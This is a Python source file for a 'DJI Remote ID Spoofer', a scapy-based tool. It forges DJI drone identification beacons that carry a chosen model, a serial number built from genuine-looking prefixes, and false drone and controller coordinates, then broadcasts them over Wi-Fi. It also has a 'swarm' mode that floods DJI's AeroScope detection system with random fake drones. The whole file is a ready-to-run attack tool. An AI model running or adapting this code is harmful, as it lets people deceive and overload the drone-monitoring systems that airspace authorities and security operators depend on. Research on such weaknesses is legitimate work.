'''
DJI Remote ID Spoofer v1.0
Conner Bender
March 2022

Example serial numbers prefixes for each model: 
* https://repair.dji.com/product/serial/index
* https://registry.faa.gov/aircraftinquiry/
'''

from scapy.all import *
from struct import *
from argparse import *
import binascii
import random
import string
import math
import argparse 

from datetime import datetime

####### 802.11 Wi-Fi Management Frame #######
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='01:02:03:04:05:06', addr3='01:02:03:04:05:06')

####### Wireless Management #######
ssid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
rates = Dot11EltRates(rates=[1,5,7,9])
channel = Dot11EltDSSSet(channel=11)

####### DJI Remote ID Packet Constructor #######
serial_prefix = {1: "W21", 2: "0JX", 3: "P76", 4: "P5A", 5: "M02",
11: "07D", 12: "05Y", 14: "M64", 15: "P7A", 16: "08Q", 17: "09Y",
18: "0AX", 21: "0AS", 23: "M80", 24: "0K1", 25: "0FZ", 26: "CE1",
27: "0HA", 28: "0N4", 30: "17U", 35: "0V2", 36: "11U", 38: "0YS",
40: "0YL", 41: "0M6", 44: "17S", 51: "276", 53: "1SZ", 58: "1WN",
59: "1UD", 60: "1ZN", 61: "37Q", 63: "3Q4", 64: "IEZ", 65: "35P",
66: "3YT", 69: "298", 70: "3Q4", 240: "YU1"}

models = {1: "Inspire 1", 2: "Phantom 3 Series", 3: "Phantom 3 Series", 4: "Phantom 3 Std", 5: "M100", 6: "ACEONE", 7: "WKM", 8: "NAZA", 9: "A2", 10: "A3",
11: "Phantom 4", 12: "MG1", 14: "M600", 15: "Phantom 3 4k", 16: "Mavic Pro", 17: "Inspire 2",
18: "Phantom 4 Pro", 20: "N2", 21: "Spark", 23: "M600 Pro", 24: "Mavic Air", 25: "M200", 26: "Phantom 4 Series",
27: "Phantom 4 Adv", 28: "M210", 30: "M210RTK", 31: "A3_AG", 32: "MG2", 34: "MG1A", 35: "Phantom 4 RTK", 36: "Phantom 4 Pro V2.0", 38: "MG1P", 
40: "MG1P-RTK", 41: "Mavic 2", 44: "M200 V2 Series", 51: "Mavic 2 Enterprise", 53: "Mavic Mini", 58: "Mavic Air 2", 
59: "P4M", 60: "M300 RTK", 61: "DJI FPV", 63: "Mini 2", 64: "AGRAS T10", 65: "AGRAS T30", 66: "Air 2S", 67: "M30", 68: "DJI Mavic 3",
69: "Mavic 2 Enterprise Advanced", 70: "Mini SE", 73: "DJI Mini 3 Pro", 240: "YUNEEC H480"}

def genFrame():
    preamble = bytes.fromhex("dd 52 26 37 12 58 62 13") # via Department 13
    sub_cmd_id_0 = b'\x11\x00'
    sub_cmd_id_2 = b'\x10\x01'
    sub_cmd_id_3 = b'\x10\x02'
    seq = pack("h", random.randint(1,255)) #random seq no.
    data_preamble_2 = b'\xdf\x0f' #state info for packet type 2
    data_preamble_3 = b'\xb7\x01' #state info for packet type 3

    if args.swarm:
        r = random.choice(list(models.keys()))
        print("\n[+] Priming " + models[r] + " frame...")
        model = r.to_bytes(1, 'little')
        prefix = serial_prefix[r]
        nonce = ''.join(random.choices(string.ascii_uppercase + string.digits, k=13))
        sn = bytes(prefix+nonce, 'utf-8')
    else:
        model = args.model.to_bytes(1, 'little')
        prefix = serial_prefix[args.model]
        nonce = ''.join(random.choices(string.ascii_uppercase + string.digits, k=13))
        sn = bytes(prefix+nonce, 'utf-8')
        print("\n[+] MODEL: " + models[args.model])
        print("[+] SERIAL NO.: " + prefix+nonce)
        if args.packet == 0:
            license = bytes(''.join(random.choices(string.ascii_uppercase + string.digits, k=10)), 'utf-8')
            license_len = b'\x0a'
            print("[+] LICENSE: " + str(license)[2:-1])
            plan = bytes(''.join(random.choices(string.ascii_uppercase + string.digits, k=9)), 'utf-8')
            plan_len = b'\x09'
            print("[+] PLAN: " + str(plan)[2:-1])

    alt = pack("h", args.altitude)
    height = pack("h", args.height)
    x_speed = pack("h", random.randint(1,255))
    y_speed = pack("h", random.randint(1,255))
    z_speed = pack("h", random.randint(1,255))
    pitch = pack("h", random.randint(1,255))
    roll = pack("h", random.randint(1,255))
    yaw = pack("h", random.randint(1,255))

    uav_lon = pack("<L", int((args.DRONE_LON/180) * math.pi * 10000000) + 2**32)
    uav_lat = pack("<L", int((args.DRONE_LAT/180) * math.pi * 10000000))

    controller_lon = pack("<L", int((args.CONTROLLER_LON/180) * math.pi * 10000000) + 2**32)
    controller_lat = pack("<L", int((args.CONTROLLER_LAT/180) * math.pi * 10000000))

    uuid = bytes(''.join(random.choices(string.digits, k=18)), 'utf-8')
    uuid_len = b'\x12'

    padding = b'\x00\x00'

    print("[+] DRONE HEIGHT: " + str(args.height/10))
    print("[+] DRONE LONGITUDE: " + str(args.DRONE_LON))
    print("[+] DRONE LATITUDE: " + str(args.DRONE_LAT))
    print("[+] CONTROLLER LONGITUDE: " + str(args.CONTROLLER_LON))
    print("[+] CONTROLLER LATITUDE: " + str(args.CONTROLLER_LAT))

    if args.packet == 0:
        packet_0 = preamble+sub_cmd_id_0+sn+license_len+license+plan_len+plan+padding

    packet_2 = preamble+sub_cmd_id_2+seq+data_preamble_2+sn+uav_lon+uav_lat+alt+height+x_speed+y_speed+z_speed+pitch+roll+yaw+controller_lon+controller_lat+model+uuid_len+uuid+padding
    packet_3 = preamble+sub_cmd_id_3+seq+data_preamble_3+sn+uav_lon+uav_lat+alt+height+x_speed+y_speed+z_speed+pitch+roll+yaw+padding*6+controller_lon+controller_lat+model

    if str(args.packet) == "0":
        print("[+] PACKET TYPE: License (0)") 
    if str(args.packet) == "2":
        print("[+] PACKET TYPE: Enhanced Wi-Fi (2)") 
    if str(args.packet) == "3":
        print("[+] PACKET TYPE: OcuSync (3)") 

    packet = eval("packet_" + str(args.packet))
    frame = RadioTap()/dot11/essid/rates/channel/packet

    return frame

'''
Checks to see if swarm flag is enabled.
Responsible for sending out the frame/packets.
'''
def launch(frame):
    i = 0
    if args.swarm:
        input("\n[*] Press enter to launch attack...")

        try:
            while True:
                sendp(genFrame(), iface=args.interface, inter=2, loop=0)
                i+=1
        except OSError:
            print("[-] Network adapter not detected...") 

    else:
        print("\n====================== Frame =========================")
        hexdump(frame)

        input("\n[*] Press enter to launch attack...")

        try:
            sendp(frame, iface=args.interface, inter=3, loop=1)
        except OSError:
            print("[-] Network adapter not detected...") 

        wrpcap(args.pcap, frame, append=False)

if __name__ == "__main__":
    ####### Argument Parser #######
    parser = argparse.ArgumentParser(description="""A DJI Remote ID spoofer for UAVs.""", formatter_class=RawTextHelpFormatter)

    parser.add_argument("-m", "--model", help="""Specify the DJI model number to spoof (Inspire 1 is default). 
    A legitimate random serial number will be generated per model.

    1: Inspire 1, 2: Phantom 3 Series, 3: Phantom 3 Series, 4: Phantom 3 Std,
    5: M100, 6: ACEONE, 7: WKM, 8: NAZA, 9: A2, 10: A3, 11: Phantom 4, 12: MG1, 14: M600, 15: Phantom 3 4k, 16: Mavic Pro,
    17: Inspire 2, 18: Phantom 4 Pro, 20: N2, 21: Spark, 23: M600 Pro, 24: Mavic Air,
    25: M200, 26: Phantom 4 Series, 27: Phantom 4 Adv, 28: M210, 30: M210RTK, 31: A3_AG, 32: MG2, 34: MG1A,
    35: Phantom 4 RTK, 36: Phantom 4 Pro V2.0, 38: MG1P, 40: MG1P-RTK, 41: Mavic 2,
    44: M200 V2 Series, 51: Mavic 2 Enterprise, 53: Mavic Mini, 58: Mavic Air 2,
    59: P4M, 60: M300 RTK, 61: DJI FPV, 63: Mini 2, 64: AGRAS T10, 65: AGRAS T30
    66: Air 2S, 67: M30, 68: DJI Mavic 3, 69: Mavic 2 Enterprise Advanced, 70: Mini SE, 73: DJI Mini 3 Pro, 240: YUNEEC H480
    """, type=int, default=1)
    parser.add_argument("-i", "--interface", help="the network interface to launch attacks", default="wlan0")
    parser.add_argument("--packet", help="""Input the packet type: 

    0: Generic License Plate (serial number only, not model)
    2: Enhanced Wi-Fi
    3: OcuSync (SDR)
    """, type=int, default=2)
    parser.add_argument("--altitude", help="Input the altitude of the drone", type=int, default=random.randint(1,255))
    parser.add_argument("--height", help="Input the height of the drone", type=int, default=random.randint(1,255))
    parser.add_argument("--DRONE_LON", help="Input the longitude of the drone", type=float, default=-110.012052)
    parser.add_argument("--DRONE_LAT", help="Input the latitude of the drone", type=float, default=35.294722)
    parser.add_argument("--CONTROLLER_LON", help="Input the longitude of the controller", type=float, default=-95.957371)
    parser.add_argument("--CONTROLLER_LAT", help="Input the latitude of the controller", type=float, default=35.284722)
    parser.add_argument("--swarm", help="Flag to enable a swarm drone attack on the AeroScope", action="store_true")
    parser.add_argument("--pcap", help="Save the attack as a .pcap file", default="attack.pcap")

    args = parser.parse_args()
    frame = genFrame()
    launch(frame)
